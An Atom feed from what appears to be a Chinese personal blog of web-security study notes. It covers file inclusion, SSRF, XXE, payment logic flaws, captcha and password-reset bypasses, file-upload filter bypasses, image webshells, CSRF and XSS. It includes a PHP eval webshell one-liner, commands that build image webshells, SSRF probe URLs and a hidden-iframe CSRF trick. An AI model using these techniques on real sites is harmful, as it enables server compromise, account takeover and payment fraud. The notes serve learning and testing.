<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>云痕</title>
  
  <subtitle>Do the right thing.</subtitle>
  <link href="http://yunhenlxx.github.io/atom.xml" rel="self"/>
  
  <link href="http://yunhenlxx.github.io/"/>
  <updated>2021-03-26T07:50:37.150Z</updated>
  <id>http://yunhenlxx.github.io/</id>
  
  <author>
    <name>云痕</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>本地包含与远程包含</title>
    <link href="http://yunhenlxx.github.io/2021/03/26/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/"/>
    <id>http://yunhenlxx.github.io/2021/03/26/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/</id>
    <published>2021-03-26T01:14:46.000Z</published>
    <updated>2021-03-26T07:50:37.150Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-定义"><a href="#0x01-定义" class="headerlink" title="0x01 定义"></a>0x01 定义</h2><p>相同代码重复出现会冗余，写一个文件，需要时调用</p><p>文件包含，只要包含了，不管什么后缀，都会被当作PHP执行</p><p>文件包含不是漏洞，只有被攻击者控制了才是漏洞</p><ul><li>本地文件包含(LFI)：控制自己服务器上的资源</li><li>远程文件包含(RFI)：通过HTTP协议控制其他地方的资源<ul><li>默认关闭，需要开启allow_url_include=on</li></ul></li></ul><h2 id="0x02-函数"><a href="#0x02-函数" class="headerlink" title="0x02 函数"></a>0x02 函数</h2><ul><li>include()</li><li>require()</li><li>include_once|require_once</li></ul>]]></content>
    
    
    <summary type="html">本地包含与远程包含</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>unserialize反序列化漏洞</title>
    <link href="http://yunhenlxx.github.io/2021/03/26/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yunhenlxx.github.io/2021/03/26/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-26T01:14:17.000Z</published>
    <updated>2021-03-26T07:30:54.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-反序列化"><a href="#0x01-反序列化" class="headerlink" title="0x01 反序列化"></a>0x01 反序列化</h2><p>序列化是将对象的状态信息转为字符串储存起来，反序列化就是再将字符串转化为状态信息</p><p>序列化和类是捆绑的</p><h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h2><p>待续</p>]]></content>
    
    
    <summary type="html">unserialize反序列化漏洞</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞</title>
    <link href="http://yunhenlxx.github.io/2021/03/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yunhenlxx.github.io/2021/03/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-26T01:13:41.000Z</published>
    <updated>2021-03-26T08:35:05.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-变量覆盖"><a href="#0x01-变量覆盖" class="headerlink" title="0x01 变量覆盖"></a>0x01 变量覆盖</h2><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值</p><h2 id="0x02-函数解析"><a href="#0x02-函数解析" class="headerlink" title="0x02 函数解析"></a>0x02 函数解析</h2><ol><li>extract()：从数组中将变量导入到当前的符号表</li><li>parse_str()：将查询字符串解析到变量中</li><li>import_request_variables()</li><li>$$</li></ol><h2 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h2><p>找到能够覆盖的点，顺藤摸瓜，构造SESSION参数获取管理员权限</p>]]></content>
    
    
    <summary type="html">变量覆盖漏洞</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="http://yunhenlxx.github.io/2021/03/25/XXE/"/>
    <id>http://yunhenlxx.github.io/2021/03/25/XXE/</id>
    <published>2021-03-25T07:24:34.000Z</published>
    <updated>2021-03-25T09:43:53.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-XXE"><a href="#0x01-XXE" class="headerlink" title="0x01 XXE"></a>0x01 XXE</h2><p>外部实体注入</p><p>XXE攻击:</p><ul><li>XML声明</li><li>DTD模版</li><li>XML，模版中的数值</li></ul><p>XML是用来存储数据的</p><h2 id="0x02-XXE原理"><a href="#0x02-XXE原理" class="headerlink" title="0x02 XXE原理"></a>0x02 XXE原理</h2><p>PHP中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象</p>]]></content>
    
    
    <summary type="html">外部实体注入</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://yunhenlxx.github.io/2021/03/25/SSRF/"/>
    <id>http://yunhenlxx.github.io/2021/03/25/SSRF/</id>
    <published>2021-03-25T06:37:30.000Z</published>
    <updated>2021-03-25T07:20:59.435Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SSRF"><a href="#0x01-SSRF" class="headerlink" title="0x01 SSRF"></a>0x01 SSRF</h2><p>服务器端请求伪造</p><ul><li>让目标站点发起网络请求</li><li>能访问公网或内网</li></ul><h2 id="0x02-挖掘"><a href="#0x02-挖掘" class="headerlink" title="0x02 挖掘"></a>0x02 挖掘</h2><p>可以发起网络请求的地方都可能存在SSRF</p><ul><li><p>看传参GET和POST是否含有协议判断是否存在SSRF</p><ul><li>http://</li><li>url=http://</li></ul></li><li><p>查看本地开放了什么端口</p><ul><li>dict://127.0.0.1</li></ul></li><li><p>探测文件内容</p><ul><li>file:///</li></ul></li></ul>]]></content>
    
    
    <summary type="html">SSRF</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>支付漏洞</title>
    <link href="http://yunhenlxx.github.io/2021/03/25/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yunhenlxx.github.io/2021/03/25/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-25T03:13:48.000Z</published>
    <updated>2021-03-25T06:28:53.219Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-快捷支付原理"><a href="#0x01-快捷支付原理" class="headerlink" title="0x01 快捷支付原理"></a>0x01 快捷支付原理</h2><ul><li>浏览器进行跳转通知：基于用户访问的浏览器（基本没了）</li><li>服务器端异步通知</li></ul><h2 id="0x02-支付漏洞"><a href="#0x02-支付漏洞" class="headerlink" title="0x02 支付漏洞"></a>0x02 支付漏洞</h2><p>逻辑漏洞，支付三部曲：订购、订单、付款</p><ul><li>修改支付价格<ul><li>三个步骤中随意一个步骤进行修改价格测试，可以尝试小金额或负数</li></ul></li><li>修改支付状态<ul><li>订单完成——未完成</li></ul></li><li>修改订单数量<ul><li>一支笔1元，买0支或者-1支</li></ul></li><li>修改附属值<ul><li>优惠券，修改金额大于或等于商品的价格，或者直接修改为负数</li></ul></li><li>越权支付<ul><li>存在user=id这种传参，修改id，使用别人的钱包付钱</li></ul></li><li>无限制试用<ul><li>试用的参数为2，正常购买的参数为1，购买参数2</li></ul></li></ul><h2 id="0x03-挖掘"><a href="#0x03-挖掘" class="headerlink" title="0x03 挖掘"></a>0x03 挖掘</h2><ul><li>找到关键的数据包</li><li>分析数据包</li></ul><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>后端检测每一项值，包括支付状态</li><li>校验价格、数量参数</li><li>与第三方支付平台检查</li><li>支付参数进行MD5加密、解密、数字签名及验证</li><li>金额超过阈值，进行人工审核</li></ul>]]></content>
    
    
    <summary type="html">支付漏洞</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>越权</title>
    <link href="http://yunhenlxx.github.io/2021/03/25/%E8%B6%8A%E6%9D%83/"/>
    <id>http://yunhenlxx.github.io/2021/03/25/%E8%B6%8A%E6%9D%83/</id>
    <published>2021-03-25T01:44:21.000Z</published>
    <updated>2021-03-25T03:01:55.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h2><p>逻辑安全漏洞，绕过权限，可以看到、修改、操作其他权限的内容</p><ul><li>平行越权</li><li>垂直越权<ul><li>向上：低权限可以操作高权限</li><li>向下：高权限可以操作低权限</li></ul></li><li>交叉越权：既可以平行，又可以垂直</li></ul><h2 id="0x02-越权思路"><a href="#0x02-越权思路" class="headerlink" title="0x02 越权思路"></a>0x02 越权思路</h2><h3 id="越权存在地点"><a href="#越权存在地点" class="headerlink" title="越权存在地点"></a>越权存在地点</h3><ul><li>网站</li><li>APP</li><li>……</li></ul><h3 id="抓取参数"><a href="#抓取参数" class="headerlink" title="抓取参数"></a>抓取参数</h3><ul><li>GET传参</li><li>POST传参</li><li>Cookie传参</li></ul>]]></content>
    
    
    <summary type="html">平行越权、垂直越权</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>验证码绕过、密码找回漏洞</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-24T07:56:57.000Z</published>
    <updated>2021-03-24T07:59:02.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-验证码绕过"><a href="#0x01-验证码绕过" class="headerlink" title="0x01 验证码绕过"></a>0x01 验证码绕过</h2><h3 id="两个流派"><a href="#两个流派" class="headerlink" title="两个流派"></a>两个流派</h3><ol><li>脚本流派（机器学习）</li><li>逻辑流派（寻找验证码的逻辑漏洞）</li></ol><h3 id="前端验证验证码，没有后端验证"><a href="#前端验证验证码，没有后端验证" class="headerlink" title="前端验证验证码，没有后端验证"></a>前端验证验证码，没有后端验证</h3><p>直接抓包进行跑数据包</p><h3 id="验证码设置了但是没有校验"><a href="#验证码设置了但是没有校验" class="headerlink" title="验证码设置了但是没有校验"></a>验证码设置了但是没有校验</h3><p>乱输入验证码也能够登录</p><h3 id="验证码可重复使用"><a href="#验证码可重复使用" class="headerlink" title="验证码可重复使用"></a>验证码可重复使用</h3><p>虽然登录失败验证码会变，但是输入原先的验证码也判定正确</p><h3 id="验证码空值绕过"><a href="#验证码空值绕过" class="headerlink" title="验证码空值绕过"></a>验证码空值绕过</h3><p>抓包将验证码的参数删除，发现验证码失效了</p><h3 id="验证码干扰过低"><a href="#验证码干扰过低" class="headerlink" title="验证码干扰过低"></a>验证码干扰过低</h3><p>使用脚本识别</p><h3 id="验证码会在HTML页面输出"><a href="#验证码会在HTML页面输出" class="headerlink" title="验证码会在HTML页面输出"></a>验证码会在HTML页面输出</h3><h3 id="验证码可控制"><a href="#验证码可控制" class="headerlink" title="验证码可控制"></a>验证码可控制</h3><p>验证码包含在URL里面</p><h3 id="验证码有规则"><a href="#验证码有规则" class="headerlink" title="验证码有规则"></a>验证码有规则</h3><p>比如是时间戳的后六位、rand函数进行随机数</p><h3 id="万能验证码"><a href="#万能验证码" class="headerlink" title="万能验证码"></a>万能验证码</h3><p>验证码无论是什么，输入000000就能直接绕过</p><h3 id="验证码有时候会藏在Cookie里"><a href="#验证码有时候会藏在Cookie里" class="headerlink" title="验证码有时候会藏在Cookie里"></a>验证码有时候会藏在Cookie里</h3><p>分析是否存在验证码的参数</p><h3 id="图片验证码"><a href="#图片验证码" class="headerlink" title="图片验证码"></a>图片验证码</h3><p>类型太少，容易识别</p><h3 id="多次登录后出现验证码"><a href="#多次登录后出现验证码" class="headerlink" title="多次登录后出现验证码"></a>多次登录后出现验证码</h3><ul><li>基于Session</li><li>基于IP：XFF、UA</li><li>基于用户：爆破用户名</li></ul><h2 id="0x02-密码找回漏洞"><a href="#0x02-密码找回漏洞" class="headerlink" title="0x02 密码找回漏洞"></a>0x02 密码找回漏洞</h2><h3 id="验证码发送后前端返回"><a href="#验证码发送后前端返回" class="headerlink" title="验证码发送后前端返回"></a>验证码发送后前端返回</h3><p>抓包后在返回包里有验证码</p><h3 id="验证码无次数限制可爆破"><a href="#验证码无次数限制可爆破" class="headerlink" title="验证码无次数限制可爆破"></a>验证码无次数限制可爆破</h3><h3 id="验证码可控"><a href="#验证码可控" class="headerlink" title="验证码可控"></a>验证码可控</h3><p>验证码写在URL参数里面</p><h3 id="直接修改密码页面"><a href="#直接修改密码页面" class="headerlink" title="直接修改密码页面"></a>直接修改密码页面</h3><p>跳过验证码页面</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>自己验证码通过改包然后修改他们密码</p>]]></content>
    
    
    <summary type="html">验证码绕过、密码找回漏洞</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-03-24T07:56:16.000Z</published>
    <updated>2021-03-24T07:56:43.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前端验证绕过"><a href="#0x01-前端验证绕过" class="headerlink" title="0x01 前端验证绕过"></a>0x01 前端验证绕过</h2><ul><li>前端校验 = 没有校验</li><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>用Brup抓包修改后缀为.php</li></ul><h2 id="0x02-Content-Type方式绕过"><a href="#0x02-Content-Type方式绕过" class="headerlink" title="0x02 Content-Type方式绕过"></a>0x02 Content-Type方式绕过</h2><ul><li><p>将一句话木马文件后缀改成可以通过的文件类型</p></li><li><p>用Brup抓包修改Content-Type为可以通过的文件类型</p></li><li><ul><li>可以通过上传可以通过的文件查看相应的格式</li></ul></li></ul><h2 id="0x03-黑名单绕过"><a href="#0x03-黑名单绕过" class="headerlink" title="0x03 黑名单绕过"></a>0x03 黑名单绕过</h2><ul><li><p>不允许上传asp,aspx,php,jsp后缀文件</p></li><li><p>尝试改成解析后一样作用的后缀上传</p></li><li><ul><li>jsp jspx jspf等</li><li>asp asa cer aspx等</li><li>php phtml php3 php4等</li><li>exe exee等</li></ul></li></ul><h2 id="0x04-htaccess文件绕过"><a href="#0x04-htaccess文件绕过" class="headerlink" title="0x04 .htaccess文件绕过"></a>0x04 .htaccess文件绕过</h2><ul><li><p>将所有解析后作用相同的后缀全部加入了黑名单</p></li><li><p>超文本入口(.htaccess)，也被称为分布式配置文件,Apache中存在，但是默认关闭</p></li><li><ul><li>AddType application/x-http-php .jpg 代表jpg文件会被当成php文件执行</li></ul></li></ul><h2 id="0x05-后缀大小写绕过"><a href="#0x05-后缀大小写绕过" class="headerlink" title="0x05 后缀大小写绕过"></a>0x05 后缀大小写绕过</h2><ul><li><p>将一句话木马文件后缀改成可以通过的文件类型</p></li><li><p>将一句话木马文件后缀改成相应的大小写后缀</p></li><li><ul><li>PHp等</li></ul></li></ul><h2 id="0x06-文件后缀-空-绕过"><a href="#0x06-文件后缀-空-绕过" class="headerlink" title="0x06 文件后缀(空)绕过"></a>0x06 文件后缀(空)绕过</h2><ul><li>大小写被强制转换成小写</li><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>将一句话木马文件后缀后面加一个空格</li></ul><h2 id="0x07-文件后缀-点-绕过"><a href="#0x07-文件后缀-点-绕过" class="headerlink" title="0x07 文件后缀(点)绕过"></a>0x07 文件后缀(点)绕过</h2><ul><li>文件后缀的前后空格被强制删除</li><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>将一句话木马文件后缀后面加一个点</li></ul><h2 id="0x08-Windows文件流绕过-DATA"><a href="#0x08-Windows文件流绕过-DATA" class="headerlink" title="0x08 Windows文件流绕过(::$DATA)"></a>0x08 Windows文件流绕过(::$DATA)</h2><ul><li>文件后缀末尾的点被强行删除</li><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>将一句话木马文件后缀后面加::$DATA</li></ul><h2 id="0x09-构造文件后缀绕过"><a href="#0x09-构造文件后缀绕过" class="headerlink" title="0x09 构造文件后缀绕过"></a>0x09 构造文件后缀绕过</h2><ul><li>文件后缀末尾不允许加::$DATA</li><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>将一句话木马文件后缀后面加点空点</li></ul><h2 id="0x10-双写文件后缀绕过"><a href="#0x10-双写文件后缀绕过" class="headerlink" title="0x10 双写文件后缀绕过"></a>0x10 双写文件后缀绕过</h2><ul><li>设置str_ireplace函数将php替换成空格</li><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>将一句话木马文件后缀修改成为pphphp</li></ul><h2 id="0x11-00截断绕过-PHP5-3以下可用"><a href="#0x11-00截断绕过-PHP5-3以下可用" class="headerlink" title="0x11 %00截断绕过(PHP5.3以下可用)"></a>0x11 %00截断绕过(PHP5.3以下可用)</h2><h3 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h3><ul><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>用Brup抓包，在上传路径/upload/后加上1.php%00将白名单机制加上的东西给截断不执行</li></ul><h3 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h3><ul><li>将一句话木马文件后缀改成可以通过的文件类型</li><li>用Brup抓包，在上传路径/upload/后加上1.phpa，a的16进制是61，在Hex中找到他将他改成%00对应的00进行截断</li></ul><h2 id="0x12-图片马绕过"><a href="#0x12-图片马绕过" class="headerlink" title="0x12 图片马绕过"></a>0x12 图片马绕过</h2><ul><li>检测文件内的内容是不是图片，不是就不给上传</li><li>将一张图片和一个一句话木马使用<code>copy 1.jpg/b + 1.txt 123.jpg</code> 命令合成一张图片马</li></ul><h2 id="0x13-getimagesize图片类型绕过"><a href="#0x13-getimagesize图片类型绕过" class="headerlink" title="0x13 getimagesize图片类型绕过"></a>0x13 getimagesize图片类型绕过</h2><ul><li>上传正常类型的图片查看是否能够正常上传</li><li>换个图片类型进行图片马制作上传</li></ul><h2 id="0x14-php-exif模块图片类型绕过"><a href="#0x14-php-exif模块图片类型绕过" class="headerlink" title="0x14 php_exif模块图片类型绕过"></a>0x14 php_exif模块图片类型绕过</h2><ul><li>上同</li></ul><h2 id="0x15-二次渲染绕过"><a href="#0x15-二次渲染绕过" class="headerlink" title="0x15 二次渲染绕过"></a>0x15 二次渲染绕过</h2><ul><li>发现上传上去的图片和下载下来的图片不一样时，说明可能进行了二次渲染</li><li>使用gif文件制作图片马，将图片用Hex打开，从第三行开始输入一句话木马</li></ul><h2 id="0x16-move-uploaded-file-截断"><a href="#0x16-move-uploaded-file-截断" class="headerlink" title="0x16 move_uploaded_file()截断"></a>0x16 move_uploaded_file()截断</h2><ul><li><p>同00截断，只不过00截断截的是路径，而这个截的是图片名字</p></li><li><p>将图片名截断</p></li><li><ul><li>1.phpa.jpg使用Hex将a的61改成00</li></ul></li></ul><h2 id="0x17-条件竞争绕过"><a href="#0x17-条件竞争绕过" class="headerlink" title="0x17 条件竞争绕过"></a>0x17 条件竞争绕过</h2><ul><li>先上传再检测才有用</li><li>就算上传成功也会在一瞬间被删除，所以用到了<code>file_put_contents</code> 函数</li><li>file_put_contents(‘1.php’,’<?php eval($REQUEST[8]); ?>‘)</li><li>利用Brup跑包访问上传了图片马并加上上一条函数作为参数的网站，访问到的一瞬间会执行<code>file_put_contents</code> 函数在服务器中写入一句话木马文件1.php</li></ul><h2 id="0x18-IIS6-0解析漏洞"><a href="#0x18-IIS6-0解析漏洞" class="headerlink" title="0x18 IIS6.0解析漏洞"></a>0x18 IIS6.0解析漏洞</h2><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><ul><li>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll</li><li>利用asp一句话木马文件1.cer制作图片马</li><li>利用Brup抓包修改文件后缀名为.cer上传</li></ul><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><ul><li><p>针对IIS6.0有效</p></li><li><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，造成文件解析漏洞，两种不同的利用方式都会被当作asp进行解析</p></li><li><ul><li>test.asp;.jpg</li><li>test.asp/123.jpg</li></ul></li><li><p>上传文件时直接修改文件名后缀</p></li></ul><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><ul><li>设置了上传存储的文件夹名为a.asp，所有上传到这个文件夹的文件都会被当做asp文件解析执行</li></ul><h2 id="0x19-CGI解析漏洞"><a href="#0x19-CGI解析漏洞" class="headerlink" title="0x19 CGI解析漏洞"></a>0x19 CGI解析漏洞</h2><ul><li>仅用于PHP</li><li>IIS7.5最多 Nginx IIS高版本都会有</li><li>随便上传一张图片马，访问图片网址后加上/.php就会被执行一句话木马文件</li></ul>]]></content>
    
    
    <summary type="html">文件上传</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Mac下制作图片马</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/Mac%E4%B8%8B%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/Mac%E4%B8%8B%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/</id>
    <published>2021-03-24T07:55:14.000Z</published>
    <updated>2021-03-24T07:56:08.875Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-将file1-txt追加到file2-jpg后面："><a href="#0x01-将file1-txt追加到file2-jpg后面：" class="headerlink" title="0x01 将file1.txt追加到file2.jpg后面："></a>0x01 将file1.txt追加到file2.jpg后面：</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat</span> file<span class="number">1</span>.txt &gt;&gt; file<span class="number">2</span>.jpg</span><br></pre></td></tr></table></figure><h2 id="0x02-将两个文件合并成第三个文件："><a href="#0x02-将两个文件合并成第三个文件：" class="headerlink" title="0x02 将两个文件合并成第三个文件："></a>0x02 将两个文件合并成第三个文件：</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat</span> file<span class="number">1</span>.txt file<span class="number">2</span>.jpg &gt;&gt; file<span class="number">3</span>.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Mac下制作图片马</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CSRF</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/CSRF/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/CSRF/</id>
    <published>2021-03-24T07:54:30.000Z</published>
    <updated>2021-03-24T07:54:54.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-CSRF原理"><a href="#0x01-CSRF原理" class="headerlink" title="0x01 CSRF原理"></a>0x01 CSRF原理</h2><p>跨站请求伪造，就是访问恶意网站时运行恶意网站上加载的JS，然后对一个已经登录的正常网站发送数据包，达到篡改信息、修改配置等功能。</p><h2 id="0x02-CSRF必要条件"><a href="#0x02-CSRF必要条件" class="headerlink" title="0x02 CSRF必要条件"></a>0x02 CSRF必要条件</h2><ul><li>没有Token防御</li><li>知道目标站点需要传的恶意数据</li></ul><h2 id="0x03-防御手段"><a href="#0x03-防御手段" class="headerlink" title="0x03 防御手段"></a>0x03 防御手段</h2><h3 id="Token本质"><a href="#Token本质" class="headerlink" title="Token本质"></a>Token本质</h3><p>一串无规律的随机值</p><h3 id="Token机制"><a href="#Token机制" class="headerlink" title="Token机制"></a>Token机制</h3><p>登录网站后，有Token机制的服务器会生成一串包含着Token的Cookie。</p><p>如果网页访问没有Token基本上就可以认定它存在CSRF，校验是必要的，必须要将CSRF打出来才能证明它存在</p><h2 id="0x04-流程"><a href="#0x04-流程" class="headerlink" title="0x04 流程"></a>0x04 流程</h2><ul><li><p>利用Burp快速生成CSRF攻击数据包，将之复制到一个html文件中就可以让用户访问进行攻击</p></li><li><p>将生成的攻击数据包的点击生效修改成延时100ms自动执行submitRequest函数</p></li><li><ul><li>setTimeout(submitRequest(),100)，加在JS最后即可</li><li>利用iframe嵌入搭建的网站，使人访问即可访问到CSRF的html文件<ul><li><code>&lt;iframe src=&quot;***.html&quot; height=0 width=0 /&gt;</code></li></ul></li></ul></li></ul>]]></content>
    
    
    <summary type="html">CSRF</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/XSS/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/XSS/</id>
    <published>2021-03-24T07:53:47.000Z</published>
    <updated>2021-03-24T07:54:22.283Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-XSS原理"><a href="#0x01-XSS原理" class="headerlink" title="0x01 XSS原理"></a>0x01 XSS原理</h2><p>跨站脚本攻击</p><p>前端代码注入，用户输入的数据被当作前端代码执行</p><p>窃取Cookie，利用Cookie登录</p><h2 id="0x02-XSS分类"><a href="#0x02-XSS分类" class="headerlink" title="0x02 XSS分类"></a>0x02 XSS分类</h2><ul><li><p>反射型XSS</p></li><li><ul><li>一次性的，必须是用户自己传参了恶意代码才能触发</li></ul></li><li><p>存储型XSS</p></li><li><ul><li>东西会被存储，页面输出时会被当作前端代码执行</li></ul></li><li><p>DOM型XSS</p></li></ul><h2 id="0x03-JS触发方式"><a href="#0x03-JS触发方式" class="headerlink" title="0x03 JS触发方式"></a>0x03 JS触发方式</h2><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> </p></li><li><p>伪协议触发</p></li><li><ul><li>javascript:alert(1)</li></ul></li><li><p>事件触发</p></li><li><ul><li>onload=alert(1)</li><li>onerror=alert(1)</li></ul></li></ul><h2 id="0x04-反射型XSS"><a href="#0x04-反射型XSS" class="headerlink" title="0x04 反射型XSS"></a>0x04 反射型XSS</h2><p>见框就插</p><h2 id="0x05-存储型XSS"><a href="#0x05-存储型XSS" class="headerlink" title="0x05 存储型XSS"></a>0x05 存储型XSS</h2><h3 id="存储型XSS会出现的地方"><a href="#存储型XSS会出现的地方" class="headerlink" title="存储型XSS会出现的地方"></a>存储型XSS会出现的地方</h3><ul><li>任何可能插入数据库的地方</li><li>用户注册的时候</li><li>留言板</li><li>上传文件的时候</li><li>(管理员可见的)报错信息</li><li>……</li></ul><p>用户的输入，一般控制的很严格</p><p>系统的获取，一般控制的不严格</p><p>防御：</p><ul><li>正则表达式过滤</li><li>html实体编码 =&gt; <code>htmlspecialchars函数</code> </li></ul><p>没有办法绕过</p><ul><li>找一个不编码的地方</li><li>编码又解码</li></ul><h2 id="0x06-DOM型XSS"><a href="#0x06-DOM型XSS" class="headerlink" title="0x06 DOM型XSS"></a>0x06 